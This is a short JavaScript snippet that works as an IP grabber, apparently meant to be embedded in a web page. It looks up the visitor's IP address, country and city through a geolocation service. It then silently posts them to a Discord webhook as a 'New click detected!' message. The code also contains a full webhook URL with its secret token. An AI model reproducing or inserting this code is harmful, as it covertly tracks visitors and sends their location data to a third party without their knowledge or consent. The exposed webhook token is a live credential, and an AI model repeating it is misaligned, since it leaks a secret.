fetch("http://ip-api.com/json/")
.then(response => response.json())
.then(data => {
  const webhookURL = "https://discord.com/api/webhooks/1340295853767921716/GYhNptRd3dW4-iR-mtI1GTY7m2KXtb3hjb1ODo7Lml3gRn0wXm_JqIQZikuwSmJmuxN7"; 

  const message = {
    content: `New click detected!\nIP: ${data.query}\nCountry: ${data.country}\nCity: ${data.city}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  })
});
